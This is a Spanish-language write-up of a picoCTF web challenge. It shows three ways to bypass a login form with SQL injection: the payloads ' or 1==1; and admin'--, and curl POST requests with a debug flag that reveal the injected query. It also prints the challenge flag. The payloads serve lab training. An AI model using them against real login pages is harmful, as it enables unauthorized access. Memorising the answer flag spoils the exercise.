### Descripción
There is a website running at `https://jupiter.challenges.picoctf.org/problem/50009/` ([link](https://jupiter.challenges.picoctf.org/problem/50009/)) or http://jupiter.challenges.picoctf.org:50009. Do you think you can log us in? Try to see if you can login!

Hints:
1. There doesn't seem to be many ways to interact with this. I wonder if the users are kept in a database?
2. Try to think about how the website verifies your login.

### Solución
Es necesario poner una inyección para poder logearse de manera correcta, la inyección es la siguiente:

```
' or 1==1;
```

Y al intentar logearse ahora si nos permite y muestra lo siguiente:
```
username: admin
password: ' or 1==1;
SQL query: SELECT * FROM users WHERE name='admin' AND password='' or 1==1;'
```

Mandando la bandera:
Your flag is: 
picoCTF{s0m3_SQL_fb3fe2ad}

### Solución 2
Cuando el formulario se procesa es enviado a login.php, por lo que hay que cambiar la url se hace mediante un método post -d y se envían los datos de este.
Usando la consola:
```
Sebas115-picoctf@webshell:~$ curl -s https://jupiter.challenges.picoctf.org/problem/50009/login.php -d "username-admin&password=password&debug=1"

<pre>username: 
password: password
SQL query: SELECT * FROM users WHERE name='' AND password='password'
</pre><h1>Login failed.</h1>Sebas115-picoctf@webshell:~$ 
```

Falta agregar la inyección para que se muestre la flag:
```
Sebas115-picoctf@webshell:~$ curl -s https://jupiter.challenges.picoctf.org/problem/50009/login.php -d "username-admin&password=' or 1==1;&debug=1"
<pre>username: 
password: ' or 1==1;
SQL query: SELECT * FROM users WHERE name='' AND password='' or 1==1;'
</pre><h1>Logged in!</h1><p>Your flag is: picoCTF{s0m3_SQL_fb3fe2ad}</p>
```

picoCTF{s0m3_SQL_fb3fe2ad}

### Solución 3
Es posible sacar la bandera con otra inyección:

```
admin'--
```

Mostrando:
```
# Logged in!

Your flag is: picoCTF{s0m3_SQL_fb3fe2ad}
```

### Notas adicionales


### Referencias

